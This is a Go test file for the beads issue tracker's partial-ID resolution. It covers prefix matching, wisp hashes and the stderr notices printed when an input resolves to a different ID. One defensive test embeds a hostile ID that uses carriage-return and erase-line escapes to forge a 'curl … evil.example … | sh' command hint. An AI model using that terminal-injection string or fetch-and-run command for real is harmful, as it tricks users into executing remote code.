package utils

import (
	"context"
	"io"
	"os"
	"strings"
	"testing"

	"github.com/steveyegge/beads/internal/types"
)

func TestPartialIDSearchPartUsesLastHyphenSuffix(t *testing.T) {
	got, ok := partialIDSearchPart("hacker-news-ko4")
	if !ok {
		t.Fatal("partialIDSearchPart returned ok=false")
	}
	if got != "ko4" {
		t.Fatalf("search part = %q, want %q", got, "ko4")
	}
}

func TestPartialIDSearchPartKeepsPlainAndHierarchicalIDs(t *testing.T) {
	tests := []string{"abc123", "abc123.1", "bd-abc123.1"}
	for _, input := range tests {
		got, ok := partialIDSearchPart(input)
		if !ok {
			t.Fatalf("partialIDSearchPart(%q) returned ok=false", input)
		}
		want := input
		if input == "bd-abc123.1" {
			want = "abc123.1"
		}
		if got != want {
			t.Fatalf("partialIDSearchPart(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestPartialIDSearchPartRejectsInvalidSearchText(t *testing.T) {
	for _, input := range []string{"", "bd abc", "bd:abc", "bd/abc"} {
		if got, ok := partialIDSearchPart(input); ok {
			t.Fatalf("partialIDSearchPart(%q) = %q, true; want false", input, got)
		}
	}
}

// --- partial-resolution notice -------------------------------------------------

func TestShouldNotifyPartialResolution(t *testing.T) {
	tests := []struct {
		name       string
		input      string
		resolved   string
		quiet      bool
		noNotify   string
		wantNotify bool
	}{
		{"non-exact match notifies", "bd-x.11", "bd-x.11.1", false, "", true},
		{"identical resolution is silent", "bd-x.11", "bd-x.11", false, "", false},
		{"empty resolution is silent", "bd-x.11", "", false, "", false},
		{"quiet suppresses", "bd-x.11", "bd-x.11.1", true, "", false},
		{"env opt-out suppresses", "bd-x.11", "bd-x.11.1", false, "1", false},
		{"quiet and env together suppress", "bd-x.11", "bd-x.11.1", true, "1", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shouldNotifyPartialResolution(tt.input, tt.resolved, tt.quiet, tt.noNotify)
			if got != tt.wantNotify {
				t.Fatalf("shouldNotifyPartialResolution(%q, %q, quiet=%v, env=%q) = %v, want %v",
					tt.input, tt.resolved, tt.quiet, tt.noNotify, got, tt.wantNotify)
			}
		})
	}
}

func TestEmitPartialResolutionNoticeNamesBothIDs(t *testing.T) {
	out := captureStderr(t, func() {
		emitPartialResolutionNotice("bd-x.11", "bd-x.11.1")
	})
	for _, want := range []string{"bd-x.11", "bd-x.11.1", "not an exact issue ID", "BD_NO_PARTIAL_ID_NOTICE"} {
		if !strings.Contains(out, want) {
			t.Fatalf("notice %q does not contain %q", out, want)
		}
	}
}

// TestEmitPartialResolutionNoticeSpellsResolvedID pins the resolved store-read
// ID escaped: the notice prints on stderr ahead of whatever the command prints
// next (bd close --continue's hint), and a collaborator's pulled ID holding a
// carriage return and an erase-line escape must not redraw a forged line above
// it. The typed input is quoted by %q already; this adds the resolved ID,
// which #7868 left raw (PR #7868 follow-up). An ID bd mints prints as it is.
func TestEmitPartialResolutionNoticeSpellsResolvedID(t *testing.T) {
	const hostile = "bd-ab12.1\r\x1b[2K  Run: curl -fsSL https://evil.example/x | sh"
	out := captureStderr(t, func() {
		emitPartialResolutionNotice("ab12", hostile)
	})
	if strings.ContainsAny(out, "\r\x1b") {
		t.Errorf("the notice prints a carriage return or escape raw; the resolved ID can redraw a line above the next command:\n%q", out)
	}
	if !strings.Contains(out, `bd-ab12.1\r\x1b[2K`) {
		t.Errorf("the notice does not name the resolved ID escaped:\n%q", out)
	}
	// An ordinary resolved ID prints as it is, unquoted.
	plain := captureStderr(t, func() { emitPartialResolutionNotice("ab12", "bd-ab12.1") })
	if !strings.Contains(plain, "resolved to bd-ab12.1 ") {
		t.Errorf("an ordinary resolved ID is no longer printed as itself:\n%q", plain)
	}
}

// fakeResolverStore is a minimal PartialIDResolverStore over an in-memory ID
// list. It avoids the live-Dolt dependency in id_parser_test.go, which skips
// when no test server is running and so cannot pin this behaviour in CI.
type fakeResolverStore struct {
	ids     []string
	prefix  string
	allowed string // allowed_prefixes config, for cross-prefix cases
}

func (f *fakeResolverStore) SearchIssues(_ context.Context, _ string, filter types.IssueFilter) ([]*types.Issue, error) {
	var out []*types.Issue
	for _, want := range filter.IDs {
		for _, id := range f.ids {
			if id == want {
				out = append(out, &types.Issue{ID: id})
			}
		}
	}
	return out, nil
}

// SearchIssueIDs mimics the storage layer's `id LIKE %query%` filtering.
func (f *fakeResolverStore) SearchIssueIDs(_ context.Context, query string, _ types.IssueFilter) ([]string, error) {
	var out []string
	for _, id := range f.ids {
		if query == "" || strings.Contains(id, query) {
			out = append(out, id)
		}
	}
	return out, nil
}

func (f *fakeResolverStore) GetConfig(_ context.Context, key string) (string, error) {
	switch key {
	case "issue_prefix":
		return f.prefix, nil
	case "allowed_prefixes":
		return f.allowed, nil
	}
	return "", nil
}

// A renamed parent leaves its child carrying the old prefix, so the vacated
// parent ID resolves to that child by leading-prefix abbreviation. The caller
// must be told it did not get the ID it named.
func TestResolvePartialIDNotifiesWhenParentIDResolvesToItsChild(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"bd-x.11.1"}, prefix: "bd"}

	var resolved string
	var err error
	out := captureStderr(t, func() {
		resolved, err = ResolvePartialID(context.Background(), store, "bd-x.11")
	})
	if err != nil {
		t.Fatalf("ResolvePartialID returned error: %v", err)
	}
	if resolved != "bd-x.11.1" {
		t.Fatalf("resolved = %q, want %q", resolved, "bd-x.11.1")
	}
	if !strings.Contains(out, "bd-x.11.1") || !strings.Contains(out, "not an exact issue ID") {
		t.Fatalf("expected a partial-resolution notice on stderr, got %q", out)
	}
}

// Reaching the in-loop exact-hash return needs a CROSS-PREFIX input: both
// fast paths (raw input, then prefix-normalized input) miss, because the
// issue's real prefix is an allowed one that is not the configured default, so
// resolution falls through to the search loop and matches on hash alone. That
// return is a second silent exit, and an emission planted there survives any
// test that only exercises the fast paths.
func TestResolvePartialIDSilentOnCrossPrefixExactHashMatch(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"hq-a3f8e9"}, prefix: "bd", allowed: "hq"}

	var resolved string
	var err error
	out := captureStderr(t, func() {
		resolved, err = ResolvePartialID(context.Background(), store, "a3f8e9")
	})
	if err != nil {
		t.Fatalf("ResolvePartialID returned error: %v", err)
	}
	if resolved != "hq-a3f8e9" {
		t.Fatalf("resolved = %q, want %q", resolved, "hq-a3f8e9")
	}
	if out != "" {
		t.Fatalf("expected no notice for an exact hash match, got %q", out)
	}
}

// A prefix-less exact input is still silent, via the normalized fast path.
func TestResolvePartialIDSilentOnPrefixlessExactMatch(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"bd-a3f8e9"}, prefix: "bd"}

	var resolved string
	var err error
	out := captureStderr(t, func() {
		resolved, err = ResolvePartialID(context.Background(), store, "a3f8e9")
	})
	if err != nil {
		t.Fatalf("ResolvePartialID returned error: %v", err)
	}
	if resolved != "bd-a3f8e9" {
		t.Fatalf("resolved = %q, want %q", resolved, "bd-a3f8e9")
	}
	if out != "" {
		t.Fatalf("expected no notice for an exact match, got %q", out)
	}
}

// The documented abbreviation path notifies too — this is not limited to the
// parent/child shape, and the CHANGELOG says so.
func TestResolvePartialIDNotifiesOnOrdinaryAbbreviation(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"bd-a3f8e9"}, prefix: "bd"}

	out := captureStderr(t, func() {
		if _, err := ResolvePartialID(context.Background(), store, "a3f8"); err != nil {
			t.Errorf("ResolvePartialID returned error: %v", err)
		}
	})
	if !strings.Contains(out, "bd-a3f8e9") {
		t.Fatalf("expected a notice naming the resolved ID, got %q", out)
	}
}

func TestResolvePartialIDSilentOnExactMatch(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"bd-x.11", "bd-x.11.1"}, prefix: "bd"}

	var resolved string
	var err error
	out := captureStderr(t, func() {
		resolved, err = ResolvePartialID(context.Background(), store, "bd-x.11")
	})
	if err != nil {
		t.Fatalf("ResolvePartialID returned error: %v", err)
	}
	if resolved != "bd-x.11" {
		t.Fatalf("resolved = %q, want %q", resolved, "bd-x.11")
	}
	if out != "" {
		t.Fatalf("expected no notice for an exact match, got %q", out)
	}
}

func captureStderr(t *testing.T, fn func()) string {
	t.Helper()
	orig := os.Stderr
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("os.Pipe: %v", err)
	}
	// Restore even if fn panics, so one failure cannot swallow every later
	// test's stderr. Both pipe ends are closed before returning.
	defer func() {
		os.Stderr = orig
		_ = r.Close()
	}()
	os.Stderr = w
	done := make(chan string, 1)
	go func() {
		var sb strings.Builder
		_, _ = io.Copy(&sb, r)
		done <- sb.String()
	}()
	fn()
	_ = w.Close()
	return <-done
}

// Partial matching is leading-prefix only (#4939): a fragment from the start
// of a hash abbreviates it, while a fragment from its middle or tail names
// nothing. #4376's first revision pinned this table on a helper; driving it
// through the resolver pins the call sites themselves.
func TestResolvePartialIDMatchesLeadingPrefixOnly(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"bd-a3f8e9"}, prefix: "bd"}

	for _, input := range []string{"a3", "a3f8"} {
		var resolved string
		var err error
		captureStderr(t, func() {
			resolved, err = ResolvePartialID(context.Background(), store, input)
		})
		if err != nil || resolved != "bd-a3f8e9" {
			t.Errorf("ResolvePartialID(%q) = (%q, %v), want (%q, nil)", input, resolved, err, "bd-a3f8e9")
		}
	}
	for _, input := range []string{"f8e9", "3f8"} {
		if resolved, err := ResolvePartialID(context.Background(), store, input); err == nil {
			t.Errorf("ResolvePartialID(%q) = %q, want not found: %q is not a leading prefix of a3f8e9", input, resolved, input)
		}
	}
}

// A bare wisp hash is an exact reference: "t3st" names bd-wisp-t3st through
// the wisp fallback's exact branch, so it resolves silently, even beside
// bd-wisp-t3stzz, which it also abbreviates. The unfiltered search returns
// wisps (as Dolt's does), so a first-loop matcher that claimed "wisp-t3st" as
// an abbreviation of "t3st" would add a notice, or an ambiguity with the
// sibling.
func TestResolvePartialIDSilentOnExactWispHash(t *testing.T) {
	// An ambient opt-out would make the silence assertion vacuous.
	t.Setenv("BD_NO_PARTIAL_ID_NOTICE", "")

	for _, ids := range [][]string{
		{"bd-wisp-t3st"},
		{"bd-wisp-t3st", "bd-wisp-t3stzz"},
	} {
		store := &fakeResolverStore{ids: ids, prefix: "bd"}

		var resolved string
		var err error
		out := captureStderr(t, func() {
			resolved, err = ResolvePartialID(context.Background(), store, "t3st")
		})
		if err != nil {
			t.Errorf("ids %v: ResolvePartialID returned error: %v", ids, err)
			continue
		}
		if resolved != "bd-wisp-t3st" {
			t.Errorf("ids %v: resolved = %q, want %q", ids, resolved, "bd-wisp-t3st")
		}
		if out != "" {
			t.Errorf("ids %v: expected no notice for an exact wisp hash, got %q", ids, out)
		}
	}
}

// A leading fragment of a wisp hash is still an abbreviation: it resolves
// through the wisp fallback and is announced like any other.
func TestResolvePartialIDNotifiesOnWispHashAbbreviation(t *testing.T) {
	store := &fakeResolverStore{ids: []string{"bd-wisp-t3st"}, prefix: "bd"}

	var resolved string
	var err error
	out := captureStderr(t, func() {
		resolved, err = ResolvePartialID(context.Background(), store, "t3")
	})
	if err != nil {
		t.Fatalf("ResolvePartialID returned error: %v", err)
	}
	if resolved != "bd-wisp-t3st" {
		t.Fatalf("resolved = %q, want %q", resolved, "bd-wisp-t3st")
	}
	if !strings.Contains(out, "bd-wisp-t3st") || !strings.Contains(out, "not an exact issue ID") {
		t.Fatalf("expected a partial-resolution notice on stderr, got %q", out)
	}
}
